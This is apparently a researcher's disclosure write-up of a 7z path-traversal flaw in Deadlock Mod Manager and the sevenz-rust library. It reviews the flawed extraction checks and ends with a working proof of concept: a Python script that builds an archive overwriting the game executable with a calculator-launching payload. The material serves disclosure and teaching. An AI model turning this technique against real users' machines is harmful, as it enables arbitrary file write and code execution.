Seven Does a Zip Slip - RCE in Deadlock Mod Manager

Introduction

Recently my friends got me hopelessly addicted to Valve's latest hit of digital heroin called Deadlock. One of the first things they showed me was Deadlock Mod Manager (which will be referred to as DLMM). They showed me mods that made their games into Gordon Freeman shooting at Po and Jacket. The only mod I ever downloaded was the one that turns all the character icons into cats, but I still often browse through its mod store to see what people have made.

Modding has always had a fraught relationship with security as mods often boil down to code that you run from unknown sources, but I was curious if it was possible to attack the mod manager itself. For a bad actor to take control of a computer via the mod manager, but without having to run a mod.

The Loading

The code for the mod manager backend is in apps/desktop/src-tauri/src/mod_manager.

I wanted to investigate the mod extraction logic as that is when the manager first interacts with a mod with on disk, but before the mod is actually ran; at which point the user has agreed to run the harmful code the mod could have (always check the mods you download kids).

The extraction code lies in archive_extractor.rs::extract_archive. The function matches the archive formats zip, rar, and 7z and calls a sub-extraction function to handle them.

    match archive_path.extension().and_then(|e| e.to_str()) {
      Some("zip") => self.extract_zip(archive_path, output_dir),
      Some("rar") => self.extract_rar(archive_path, output_dir),
      Some("7z") => self.extract_7z(archive_path, output_dir),
      Some(ext) => Err(Error::ModExtractionFailed(format!(
        "Unsupported archive format: {ext}"
      ))),
      None => Err(Error::ModExtractionFailed(
        "Could not determine archive format".to_string(),
      )),
    }?;

Primer on archives

The specifics depends from format to format, but archives boil down to a list of compressed data and the paths to they get written to. These paths are relative within the extraction directory (e.g. ./homework/essayfinal.docx gets extracted to extraction_folder/homework/essayfinal.docx). It is up to the archive extractor to verify that those paths aren't pointing outside the extraction directory (e.g. ../evil.exe or C:\Temp\hidden.txt).

extract_7z

The sub-extraction functions iterate through each file individually and checks if the file path is inside the the extraction directly. The exception is extract_7z, as the library they used to extract 7z archives, sevenz-rust, is unable to process files singularly. To work around this limitation, DLMM says they "validate that the output directory is properly sandboxed by the calling code before extraction."

sevenz_rust::decompress_file(
  archive_path.to_string_lossy().as_ref(),
  output_dir.to_string_lossy().as_ref(),
)
.map_err(|e| Error::ModExtractionFailed(e.to_string()))?;

// After extraction, validate that no files were extracted outside the target directory
self.validate_extracted_files(output_dir)?;

Huh, it looks like they validated after extracting the archive. If we were to escape the extraction directory, our files would be written to disk before the program could validate. But it is still worth checking the validation function as they might still catch us and warn the user.

/// Validate that all extracted files are within the expected output directory
  fn validate_extracted_files(&self, output_dir: &Path) -> Result<(), Error> {
    let canonical_output = output_dir
      .canonicalize()
      .map_err(|_| Error::UnauthorizedPath("Unable to resolve output directory".to_string()))?;

    self.validate_directory_recursive(output_dir, &canonical_output)?;
    Ok(())
  }

They check if any files were extracted outside the target directory by recursively checking files... in the target directory. Effectively pointless.

We now know that there is no efficacious validation for 7z archives by DLMM, but it doesn't matter if we can't escape the extraction directory from the sevenz_rust::decompress_file call.

sevenz-rust

Searching online for vulnerabilities gave nothing for sevenz-rust directly, but there was a zip slip vulnerability posting for sevenz-rust2. sevenz-rust2 was a library made by some contributors after sevenz-rust got abandoned. I had a hunch that sevenz-rustmight have the same or similar zip slip vuln, as something of that magnitude would likely be a carry over from the original library rather than something being introduced in a new version.

Looking at the source code of sevenz-rust, we can see that the logic pertaining to extraction is in de_funcs.rs::decompress_impl.

We can see that the extraction loop inside the function blindly joins the two paths together and passes it into extract_fn. extract_fn is a supplied argument from decompress_impl and defaults to default_entry_extract_fn.

seven.for_each_entries(|entry, reader| {
	let dest_path = dest.join(entry.name());
	extract_fn(entry, reader, &dest_path)
})?;

And looking at default_entry_extract_fn, we can see that there is no validation to prevent zip slips here either before it creates the file to write to.

The Attack

Since DLMM doesn't properly validate extraction paths and sevenz-rust doesn't validate at all, we now have the ability to extract a file anywhere outside of the extraction directory, an arbitrary file write. From here there are many ways to escalate this into remote command execution, such as writing a program into the windows start menu folder, but a fun one to do would be replacing Deadlock itself.

Archive software like 7zip won't allow us to make a 7z archive with a zip slip in it, so we will have to construct it ourselves. For the PoC, we will make a fake Mina skin to prank a person who mods their game to have all the women remodeled for some reason.

Our mod will have two files in it:

payload.exe: A malicious program that we will replace Deadlock with. For this example we will make it simply open calculator.

fn main() {
    std::process::Command::new("calc.exe").spawn();
}

And test.vpk: Any valid vpk that will load into the game. This is not necessary for the zip slip to occur but it prevents any miscellaneous errors that would arouse user suspiscion.

We can create the mod archive manually using this python script.

import py7zr
import io
py7zr.py7zr.check_archive_path = lambda path: True
with py7zr.SevenZipFile('minaHaSkin.7z', 'w') as archive:
    archive.writef(io.BytesIO(open('./calc_payload.exe', 'rb').read()),
        # The zip slip works with both relative and absolute paths, using absolute for simplicity
        "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Deadlock\\game\\bin\\win64\\deadlock.exe")
    archive.write("./test.vpk", arcname="test.vpk")

Loading our mod locally into DLMM and launch the game we can see that instead of the game, it opens up the Calculator, even though we launched the game specifically without mods.

Conclusion

The vulnerability has been reported to DLMM and has been patched for version 2.0.0. The path traversal in sevenz-rust has been reported to RustSec and has been given the advisory RUSTSEC-2026-0245

The thing that stuck out to me during this process was how the DLMM team clearly anticipated this happened and tried to put in measures, but those measures were completely paradoxical. The docstring saying that the validation was done before extraction placed directly next to a comment saying the validation was after, and the validation checking for extractions outside a folder by only checking said folder. The most probable explanation would be that this section was vibe coded and wasn't properly reviewed. This is my hesitation about vibe coding, not that the generated code won't work, but because it tempts the viber not to fully understand said code because it "works" and then potentially letting dangerous things caused by the AI slip by.

But this exploit was only possible because of a vulnerable library made before AI, so maybe we shouldn't trust the humans with coding either.
